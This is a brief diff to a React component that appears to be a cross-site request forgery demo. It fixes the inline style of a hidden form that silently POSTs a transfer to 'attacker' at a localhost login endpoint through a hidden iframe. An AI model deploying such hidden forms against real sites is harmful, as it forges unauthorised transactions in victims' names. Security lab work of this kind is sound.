@@ -37,7 +37,7 @@ function App() {
   
   return (
     <>
-      <div style="display:none;">
+      <div style={{ display: 'none' }}>
         <form id="csrfForm" action="http://localhost:3000/login" method="POST" target="hiddenFrame">
           <input type="hidden" name="recipient" value="attacker" />
           <input type="hidden" name="amount" value="1000" />
